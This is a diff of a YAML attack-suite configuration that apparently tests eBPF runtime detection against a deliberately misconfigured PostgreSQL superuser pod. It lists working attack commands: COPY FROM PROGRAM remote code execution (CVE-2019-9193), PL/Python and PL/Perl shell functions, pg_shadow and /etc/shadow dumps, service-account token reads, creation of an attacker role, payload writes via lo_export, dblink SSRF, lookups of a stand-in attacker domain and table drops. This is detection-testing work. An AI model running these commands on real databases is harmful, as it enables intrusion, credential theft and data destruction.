@@ -1,19 +1,18 @@
 apiVersion: bobctl.k8sstormcenter.io/v1alpha1
 kind: AttackSuite
 metadata:
-  name: postgres-vuln-cve-2019-9193
+  name: postgres-vuln-killchain-attacks
   description: >-
-    CVE-2019-9193 kill-chain attack suite: demonstrates how a misconfigured
-    PostgreSQL deployment (superuser access) allows SQL-to-RCE via COPY FROM
-    PROGRAM. Every attack uses pure SQL — no kubectl exec post-exploitation
-    needed. The PROGRAM commands execute on the PostgreSQL SERVER container,
-    producing kernel-visible processes detectable by eBPF-based runtime
-    security (node-agent). This is the poster-child example of how BoB detects
-    SQL-based remote code execution.
-    Covers MITRE ATT&CK: T1190 (Initial Access), T1059 (Execution),
-    T1552 (Credential Access), T1082/T1057 (Discovery), T1048 (Exfiltration),
-    T1070 (Defense Evasion), T1485 (Impact).
-    NOTE: Commands are deliberately chosen to NOT overlap with postgres
+    Full kill-chain PostgreSQL attack suite for the deliberately-misconfigured
+    superuser deployment (CVE-2019-9193). Mirrors ALL attacks from the regular
+    postgres suite PLUS superuser-specific COPY FROM PROGRAM RCE attacks.
+    Two delivery mechanisms:
+    (1) SQL-based attacks via psql — including COPY FROM/TO PROGRAM which
+        executes commands on the SERVER container (detectable by eBPF).
+    (2) kubectl exec post-exploitation into the client pod.
+    Covers MITRE ATT&CK: T1190, T1059, T1552, T1082, T1057, T1048, T1070,
+    T1485, T1036, T1611, T1496, T1078, T1505.
+    NOTE: COPY FROM PROGRAM commands are chosen to NOT overlap with postgres
     docker-entrypoint.sh binaries (cat, ls, id, find, getent are in the
     server's baseline profile). We use head, wc, whoami, hostname, ps, etc.
 target:
@@ -34,10 +33,37 @@ attacks:
     expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
-  # Phase 1: RECONNAISSANCE (TA0043) — System enumeration via SQL RCE
+  # Phase 1: RECONNAISSANCE (TA0043) — Database & system enumeration
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1082 — System Information Discovery: hostname
+  # T1082 — System Information Discovery (DB settings)
+  - name: sql-dump-settings
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT name, setting FROM pg_settings WHERE name LIKE '%password%' OR name LIKE '%auth%';"]
+    expectedDetections: []
+
+  # T1083 — File and Directory Discovery (table enumeration)
+  - name: sql-dump-all-tables
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');"]
+    expectedDetections: []
+
+  # T1082 — System Information Discovery (schema dump via exec)
+  - name: exec-pg-dump-schema
+    type: cmdinject
+    exec:
+      command: ["pg_dump", "-h", "pg-vuln", "-d", "app", "--schema-only"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-vuln-client
+        command: pg_dump
+
+  # T1082 — System Information Discovery: hostname (COPY FROM PROGRAM)
   - name: cve-recon-hostname
     type: sqli
     exec:
@@ -51,7 +77,7 @@ attacks:
         containerName: postgres
         command: hostname
 
-  # T1082 — System Information Discovery: uname
+  # T1082 — System Information Discovery: uname (COPY FROM PROGRAM)
   - name: cve-recon-uname
     type: sqli
     exec:
@@ -98,12 +124,134 @@ attacks:
         command: printenv
 
   # ═══════════════════════════════════════════════════════════════════════════
-  # Phase 7: CREDENTIAL ACCESS (TA0006) — Read sensitive files via SQL RCE
-  # NOTE: We use 'head' instead of 'cat' because cat is in the postgres
-  # entrypoint profile. head is not, so it triggers R0001.
+  # Phase 3: EXECUTION (TA0002) — Command execution (exec into client)
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1552.001 — Credentials in Files: /etc/passwd
+  # T1059.004 — Unix Shell (whoami via exec)
+  - name: exec-whoami
+    type: cmdinject
+    exec:
+      command: ["whoami"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-vuln-client
+        command: whoami
+
+  # T1059.004 — Unix Shell (exec from /dev/shm)
+  - name: exec-devshm
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_pg && chmod +x /dev/shm/malicious_pg && /dev/shm/malicious_pg pwned && rm -f /dev/shm/malicious_pg"]
+    expectedDetections:
+      - ruleID: R1000
+        ruleName: Process executed from malicious source
+        containerName: pg-vuln-client
+        command: malicious_pg
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 5: PRIVILEGE ESCALATION (TA0004) — SQL-based priv esc
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1078.004 — Valid Accounts: Create superuser
+  - name: sql-create-superuser
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE ROLE attacker WITH SUPERUSER LOGIN PASSWORD 'pwned';"]
+    expectedDetections: []
+
+  # T1611 — Escape to Host (unshare attempt via exec)
+  - name: exec-unshare
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "unshare -r id 2>&1 || echo unshare_blocked"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1036 — Masquerading: drifted binary (exec into client)
+  - name: exec-drifted-binary
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_pg && /tmp/drifted_pg /etc && rm -f /tmp/drifted_pg"]
+    expectedDetections:
+      - ruleID: R1001
+        ruleName: Drifted process executed
+        containerName: pg-vuln-client
+        command: drifted_pg
+
+  # T1070.004 — Indicator Removal: delete exfiltrated data (COPY FROM PROGRAM)
+  - name: cve-evasion-rm
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'rm -f /tmp/exfil_data.txt && echo removed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "removed"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: rm
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal credentials
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: pg_shadow dump (SQL)
+  - name: sql-dump-pg-shadow
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT usename, passwd FROM pg_shadow;"]
+    expectedDetections: []
+
+  # T1552.001 — Credentials in Files: SA token (exec into client)
+  # Uses 'head' instead of 'cat' because cat is learned by the client pod
+  # (postgres docker-entrypoint.sh uses cat during init).
+  - name: exec-sa-token
+    type: cmdinject
+    exec:
+      command: ["head", "-1", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
+    expectedDetections:
+      - ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: pg-vuln-client
+        command: head
+
+  # T1552.001 — Credentials in Files: /etc/shadow (exec into client)
+  # R0010 does not reliably fire for exec-into-pod on Kind/k3s — the file open
+  # happens before node-agent can attribute it to the new exec.
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["head", "-5", "/etc/shadow"]
+    expectedDetections: []
+
+  # T1552.001 — Credentials in Files: /etc/passwd (exec into client)
+  - name: exec-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["head", "-5", "/etc/passwd"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-vuln-client
+        command: head
+
+  # T1552 — Symlink to access sensitive file (exec into client)
+  # R1010 does not reliably fire for exec-into-pod on Kind/k3s.
+  - name: exec-symlink
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && head -1 /tmp/shadow_link && rm -f /tmp/shadow_link"]
+    expectedDetections: []
+
+  # T1552.001 — Credentials in Files: /etc/passwd (COPY FROM PROGRAM)
+  # Uses 'head' instead of 'cat' because cat is in the postgres entrypoint profile.
   - name: cve-cred-passwd
     type: sqli
     exec:
@@ -117,7 +265,7 @@ attacks:
         containerName: postgres
         command: head
 
-  # T1552.001 — Credentials in Files: /etc/shadow
+  # T1552.001 — Credentials in Files: /etc/shadow (COPY FROM PROGRAM)
   # head fails (permission denied) but the process spawn still triggers R0001.
   - name: cve-cred-shadow
     type: sqli
@@ -132,7 +280,7 @@ attacks:
         containerName: postgres
         command: head
 
-  # T1552.001 — Credentials in Files: /proc/1/environ (environment variables)
+  # T1552.001 — Credentials in Files: /proc/1/environ (COPY FROM PROGRAM)
   # Uses wc instead of cat because /proc/1/environ contains null bytes that
   # break PostgreSQL's COPY text parser. wc still opens the file (triggers
   # R0008) and is not a normal postgres process (triggers R0001).
@@ -153,7 +301,7 @@ attacks:
         containerName: postgres
         command: wc
 
-  # T1552.001 — Credentials in Files: Kubernetes service account token
+  # T1552.001 — Credentials in Files: Kubernetes SA token (COPY FROM PROGRAM)
   - name: cve-cred-sa-token
     type: sqli
     exec:
@@ -170,11 +318,67 @@ attacks:
       # the token open happens inside the postgres backend, not via a
       # standalone process that node-agent can attribute to a new exec.
 
+  # T1552.001 — Read pg_hba.conf via SQL (superuser can read any file)
+  - name: sql-read-pg-hba
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');"]
+    expectedDetections: []
+
+  # T1552.001 — Read /etc/passwd via SQL
+  - name: sql-read-etc-passwd
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT pg_read_file('/etc/passwd');"]
+    expectedDetections: []
+
+  # T1552.001 — pg_read_file: read /etc/hostname
+  - name: sql-pg-read-file-hostname
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT pg_read_file('/etc/hostname');"]
+    expectedDetections: []
+
+  # T1552.001 — pg_read_file: read SA token
+  - name: sql-pg-read-file-sa-token
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/token');"]
+    expectedDetections: []
+
   # ═══════════════════════════════════════════════════════════════════════════
-  # Phase 8: DISCOVERY (TA0007) — System enumeration
+  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1057 — Process Discovery: ps
+  # T1082 — System Information Discovery: /proc/environ (exec into client)
+  # Uses 'od' to avoid null-byte issues and because cat is learned.
+  - name: exec-proc-environ
+    type: cmdinject
+    exec:
+      command: ["od", "-c", "/proc/1/environ"]
+    expectedDetections:
+      - ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: pg-vuln-client
+        command: od
+
+  # T1046 — Network Service Discovery (exec into client)
+  # Uses 'head' instead of 'cat' because cat is in the client's learned profile.
+  - name: exec-net-recon
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "head -20 /etc/resolv.conf && head -20 /etc/hosts && getent hosts kubernetes.default.svc || true"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-vuln-client
+        command: head
+
+  # T1057 — Process Discovery: ps (COPY FROM PROGRAM)
   - name: cve-disc-ps
     type: sqli
     exec:
@@ -188,7 +392,7 @@ attacks:
         containerName: postgres
         command: ps
 
-  # T1046 — Network Service Discovery: network config
+  # T1046 — Network Service Discovery: network config (COPY FROM PROGRAM)
   - name: cve-disc-net
     type: sqli
     exec:
@@ -203,10 +407,26 @@ attacks:
         command: head
 
   # ═══════════════════════════════════════════════════════════════════════════
-  # Phase 10: COLLECTION (TA0009) — Data exfiltration via COPY TO PROGRAM
+  # Phase 10: COLLECTION (TA0009) — Data staging & exfiltration
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1074 — Data Staged: COPY TO PROGRAM writes query results to file
+  # T1005 — Data from Local System: large object import
+  - name: sql-large-object-import
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT lo_import('/etc/hostname');"]
+    expectedDetections: []
+
+  # T1074 — Data Staged: COPY TO file (SQL only, no PROGRAM)
+  - name: sql-copy-exfil
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "COPY (SELECT * FROM bobtest) TO '/tmp/exfil.csv';"]
+    expectedDetections: []
+
+  # T1074 — Data Staged: COPY TO PROGRAM (writes query results to pipe)
   - name: cve-exfil-copy-to
     type: sqli
     exec:
@@ -221,28 +441,39 @@ attacks:
         command: tee
 
   # ═══════════════════════════════════════════════════════════════════════════
-  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
+  # Phase 11: EXFILTRATION (TA0010) — DNS exfiltration
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1070.004 — Indicator Removal: delete exfiltrated data
-  - name: cve-evasion-rm
+  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon (exec)
+  - name: exec-dns-anomaly
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 12: IMPACT (TA0040) — Data destruction and crypto mining
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1485 — Data Destruction: DROP TABLE (SQL)
+  - name: sql-drop-table
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'rm -f /tmp/exfil_data.txt && echo removed'; SELECT * FROM cmd_out;"]
-    successIndicators:
-      - bodyContains: "removed"
+                "DROP TABLE IF EXISTS bobtest_exfil;"]
+    expectedDetections: []
+
+  # T1496 — Resource Hijacking: crypto mining DNS signal (exec)
+  - name: exec-crypto-dns
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
     expectedDetections:
-      - ruleID: R0001
-        ruleName: Unexpected process launched
-        containerName: postgres
-        command: rm
+      - ruleID: R1008
+        ruleName: Crypto Mining Domain Communication
+        containerName: pg-vuln-client
 
-  # ═══════════════════════════════════════════════════════════════════════════
-  # Phase 12: IMPACT (TA0040) — Data destruction
-  # ═══════════════════════════════════════════════════════════════════════════
-
-  # T1485 — Data Destruction: DROP TABLE
+  # T1485 — Data Destruction: DROP TABLE (COPY FROM PROGRAM)
   - name: cve-impact-drop-table
     type: sqli
     exec:
@@ -253,8 +484,127 @@ attacks:
     expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
-  # Cleanup
+  # CVE-BASED ATTACKS — Historical PostgreSQL vulnerabilities (SQL only)
+  # These run as superuser so all succeed (unlike regular postgres where
+  # the app user lacks privileges for COPY FROM PROGRAM).
   # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2019-9193 — COPY FROM PROGRAM: id
+  - name: cve-2019-9193-copy-program-id
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_output(line text); COPY cmd_output FROM PROGRAM 'id';"]
+    expectedDetections: []
+
+  # CVE-2019-9193 — COPY FROM PROGRAM: whoami
+  - name: cve-2019-9193-copy-program-whoami
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DROP TABLE IF EXISTS cmd_out2; CREATE TABLE cmd_out2(line text); COPY cmd_out2 FROM PROGRAM 'whoami'; SELECT * FROM cmd_out2;"]
+    expectedDetections: []
+
+  # CVE-2019-9193 — COPY FROM PROGRAM: cat /etc/passwd
+  - name: cve-2019-9193-copy-program-passwd
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DROP TABLE IF EXISTS cmd_out3; CREATE TABLE cmd_out3(line text); COPY cmd_out3 FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM cmd_out3 LIMIT 5;"]
+    expectedDetections: []
+
+  # CVE-2019-9193 — COPY TO PROGRAM (write to pipe)
+  - name: cve-2019-9193-copy-to-program
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "COPY (SELECT 'pwned_via_copy_to_program') TO PROGRAM 'tee /tmp/pg_pwned 2>/dev/null || true';"]
+    expectedDetections: []
+
+  # T1059 — PL/Python untrusted language (RCE via CREATE FUNCTION)
+  - name: sql-plpython3u-rce
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpython3u; SELECT exec_cmd('id');"]
+    expectedDetections: []
+
+  # T1059 — PL/Perl untrusted language (alternative RCE path)
+  - name: sql-plperlu-rce
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE EXTENSION IF NOT EXISTS plperlu; CREATE OR REPLACE FUNCTION perl_exec(cmd text) RETURNS text AS $$ my $output = `$_[0]`; return $output; $$ LANGUAGE plperlu; SELECT perl_exec('whoami');"]
+    expectedDetections: []
+
+  # CVE-2018-1058 — Schema search_path hijacking
+  - name: cve-2018-1058-search-path-hijack
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE OR REPLACE FUNCTION public.upper(text) RETURNS text AS $$ SELECT 'CVE-2018-1058:hijacked:' || $1; $$ LANGUAGE SQL; SELECT upper('test');"]
+    expectedDetections: []
+
+  # T1190 — lo_export: write arbitrary file via large object
+  # lo_from_bytea returns a new OID; we capture it and pass to lo_export.
+  - name: sql-lo-export-file-write
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DO $$ DECLARE oid_ oid; BEGIN oid_ := lo_from_bytea(0, E'#!/bin/sh\\nid > /tmp/pg_rce_proof\\n'); PERFORM lo_export(oid_, '/tmp/pg_payload.sh'); PERFORM lo_unlink(oid_); END $$; SELECT 'lo_export_done';"]
+    expectedDetections: []
+
+  # T1190 — dblink SSRF (connect to internal services from DB)
+  # The connection will fail (port 443 is not PG) but the extension loads and
+  # the attempt proves SSRF reachability. We catch the error to avoid exit 1.
+  - name: sql-dblink-ssrf
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE EXTENSION IF NOT EXISTS dblink; DO $$ BEGIN PERFORM dblink_connect('host=kubernetes.default.svc port=443 dbname=postgres connect_timeout=2'); EXCEPTION WHEN OTHERS THEN RAISE NOTICE 'dblink_ssrf_attempted: %', SQLERRM; END $$; SELECT 'dblink_done';"]
+    expectedDetections: []
+
+  # T1505 — ALTER SYSTEM persistence (write to postgresql.auto.conf)
+  - name: sql-alter-system-persist
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "ALTER SYSTEM SET log_connections = off;"]
+    expectedDetections: []
+
+  # CVE-2023-5868 — Aggregate function memory disclosure
+  - name: cve-2023-5868-aggregate-leak
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "SELECT array_agg(DISTINCT x ORDER BY x) FROM generate_series(1,1000) AS x;"]
+    expectedDetections: []
+
+  # CVE-2023-39417 — Extension script injection
+  - name: cve-2023-39417-extension-inject
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE EXTENSION IF NOT EXISTS pg_stat_statements;"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Cleanup — restore state for next run
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  - name: cleanup-drop-roles
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DROP ROLE IF EXISTS attacker;"]
+    expectedDetections: []
+
+  - name: cleanup-drop-temp-tables
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DROP TABLE IF EXISTS cmd_output; DROP TABLE IF EXISTS cmd_out2; DROP TABLE IF EXISTS cmd_out3;"]
+    expectedDetections: []
 
   - name: cleanup-recreate-bobtest
     type: sqli
